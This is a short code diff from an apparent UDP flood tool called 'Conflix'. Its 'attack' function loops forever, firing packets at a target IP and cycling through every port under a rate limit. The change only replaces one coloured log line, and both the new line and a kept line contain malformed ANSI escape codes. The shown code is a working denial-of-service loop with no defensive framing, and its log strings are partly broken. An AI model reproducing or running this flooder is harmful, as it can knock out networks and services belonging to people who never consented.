@@ -54,7 +54,7 @@ def attack(ip: str, port: int, packet_size: int, rate_limit: float):
         while True:
             sock.sendto(data, (ip, port))
             sent += 1
-            log_message(f"\033[33mConflix -> \033[0;37m{threading.get_ident()}\033[37m::: \033[32mSent =⟩{sent} \033[96m{ip}\033[97m:{port} \033[1;34m")
+            log_message(f"\033[48;5;3m\033[38;5;0{ip}m")
             log_message(f"\033[32mConflix -> \033[94m{threading.get_ident()}\033[1;31::: \033[36mSent =⟩{sent} \033[93m{ip}\033[93m:{port} \033[0;33m")
             port = port + 1 if port < 65534 else 1
             time.sleep(rate_limit)
